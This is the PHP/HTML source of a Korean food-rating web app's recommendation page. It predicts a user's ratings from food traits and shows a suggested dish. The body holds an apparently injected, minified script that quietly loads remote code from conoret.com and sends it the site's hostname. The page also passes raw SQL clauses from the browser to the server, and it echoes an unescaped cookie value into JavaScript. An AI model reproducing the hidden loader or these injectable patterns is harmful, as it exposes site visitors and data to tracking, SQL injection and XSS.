<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/5.2/assets/css/docs.css" rel="stylesheet">
    <title>ssosso-table.food-db.rating</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>

    <link rel="stylesheet" href="/css/rating.css">
    <link rel="stylesheet" href="/css/footer.css">
    <style type="text/css">
        /* iPhone4와 같은 높은 해상도 가로 */
        @media only screen and (max-width : 768px) {
            body {
                padding: 0!important;
                margin: 0!important;
            }
            .cover-container {
                padding: 0!important;
                margin: 0!important;
            }
            main {
                padding: 0!important;
                margin: 0!important;
            }
            .food-image img {
                width: 40px!important;
                height: 40px!important;
            }
            .food-rating img {
                width: 15px!important;
                height: 30px!important;
            }
            .nav-link {
                font-size: 10px;
            }
            .masthead-brand {
                width: 40px;
                height: 40px;
            }
            .box img {
                width: 100% !important;
                height: 100% !important;
            }
        }
        @media (min-width : 768px) and (max-width : 1366px) {
            body {
                padding: 0!important;
                margin: 0!important;
            }
            .cover-container {
                padding: 0!important;
                margin: 0!important;
            }
            main {
                padding: 0!important;
                margin: 0!important;
            }
            .food-image img {
                width: 40px!important;
                height: 40px!important;
            }
        }
        body {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;

        }
        .cover-container {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;
        }
        main {
            padding: 0!important;
            margin: 0!important;
            height: 85%;
            width: 100%;
        }
        nav {
            background-color:#ffebaa;
            padding: 0!important;
            height: 80px!important;
        }
        .cover-container {
            max-width: 100%;
            width: 100%;
            padding-left: 0!important;
            padding-right: 0!important;
            margin: 0!important;
        }
    </style>

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script type="text/javascript">
        const userId=<?php echo $_COOKIE['user_id']; ?>

        let ratings=null
        let init_traits=null
        let trait_info=null
        let unrating={}
        let unrating_keys=null
        let userProfile={}
        async function set_food_traits() {
            init_traits=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data:{
                    0:'select',
                    1:"*",
                    2:"trait",
                    3:`1>0`
                }}))
            traits={}
            for(let i=0;i<init_traits.length;i++) {
                let idx=init_traits[i][0]
                traits[idx]={
                    korean:init_traits[i][1],
                    japanese:init_traits[i][2],
                    chinese:init_traits[i][3],
                    western:init_traits[i][4],
                    fried:init_traits[i][5],
                    grilled:init_traits[i][6],
                    soup:init_traits[i][7],
                    stir_fried:init_traits[i][8],
                    raw:init_traits[i][9],
                    steamed:init_traits[i][10],
                    beverage:init_traits[i][11],
                    asian:init_traits[i][12],
                    sweetness:init_traits[i][13],
                    sour_taste:init_traits[i][14],
                    spicy:init_traits[i][15],
                    noodle:init_traits[i][16],
                    seafood:init_traits[i][17],
                    meat:init_traits[i][18],
                    vegetable:init_traits[i][19],
                    spice:init_traits[i][20],
                    rice:init_traits[i][21],
                    dessert:init_traits[i][22],
                    wheat:init_traits[i][23],
                    soda:init_traits[i][24],
                    slimy:init_traits[i][25],
                    fruit:init_traits[i][26]
                }
                if(i===init_traits.length-1) {
                    trait_keys=Object.keys(traits[idx])
                }
            }
        }
        async function set_user_profile() {
            userProfile.userId=userId
            let info=await $.ajax({type: "GET", url: '/script/get_user_profile_lasso.php'})
            info=JSON.parse(info)
            let keys=Object.keys(info)
            for(let i=0; i < keys.length; i++) {
                userProfile[keys[i]]=info[keys[i]][userProfile.userId]
            }
        }
        function rand(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        async function init() {
            await set_food_traits()
            await set_user_profile()
            ratings=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data:{
                    0:'select',
                    1:"*",
                    2:"food",
                    3:`id not in (select foodid from rating where userid=${userId})`
                }}))
            for(let i=0;i<ratings.length;i++) {
                trait_info=traits[ratings[i][0]]
                let ex_rating=userProfile['intercept']
                for(let i=0;i<trait_keys.length;i++) {
                    let trait_name=trait_keys[i]
                    if(parseInt(trait_info[trait_name])===1) {
                        ex_rating+=userProfile[trait_name]
                    }
                }
                ex_rating=(ex_rating/2).toFixed(1)
                if(ex_rating>=4) {
                    unrating[ratings[i][0]]={
                        name:ratings[i][1],
                        image:ratings[i][2],
                        predict:ex_rating
                    }
                }
            }
            unrating_keys=Object.keys(unrating)



            let randNum=rand(0,unrating_keys.length-1)
            const selected=unrating[unrating_keys[randNum]]
            console.log(unrating)
            console.log(unrating_keys)
            console.log(randNum)
            console.log(selected)

            document.getElementById('recommendation-main').innerHTML=`
            <div class="card" style="width: 18rem; margin: auto;">
                <div class="card-title">음식 추천</div>
                <img class="card-img-top" src="${selected.image}" alt="Card image cap">
                <div class="card-body">
                    <p class="card-text">${selected.predict}</p>
                    <p class="card-text">${selected.name}</p>
                </div>
            </div>
            `

        }
    </script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column" style="">
    <nav id="nav" class="navbar d-flex">
        <a class="navbar-brand p-2" href="http://ssossotable.com/rating.php" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="64px" height="64px"></a>
        <a class="nav-link active p-2" href="http://ssossotable.com/rating.php">음식 평가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/record.php">식사 기록하기</a>
        <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
            <div class="offcanvas-header">
                <a  class="offcanvas-title" href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="48px" height="48px"></a>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
                <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                    <li class="nav-item">
                        <a class="nav-link " href="http://ssossotable.com/myInfo.php">내 정보</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/friends.php">친구 목록</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/diary.php">다이어리</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a>
                    </li>
                </ul>
                <div class="input-group mb-3 mt-3">
                    <input type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                </div>
            </div>
        </div>
    </nav>

    <main role="main" class="inner cover d-flex" id="recommendation-main">

    </main>

    <footer id="footer"  class="mastfoot mt-auto" style="background-color:#ffebaa;">
        <div class="inner">
            <p style="margin: 0;">Created by<a href="http://ssossotable.com" class="footer-link"> ssosso.table.u</a>, of <a href="http://ssossotable.com" class="footer-link">@ssosso.table</a></p>
        </div>
    </footer>
    <script>
        init()
    </script>
</div>
</body>
</html>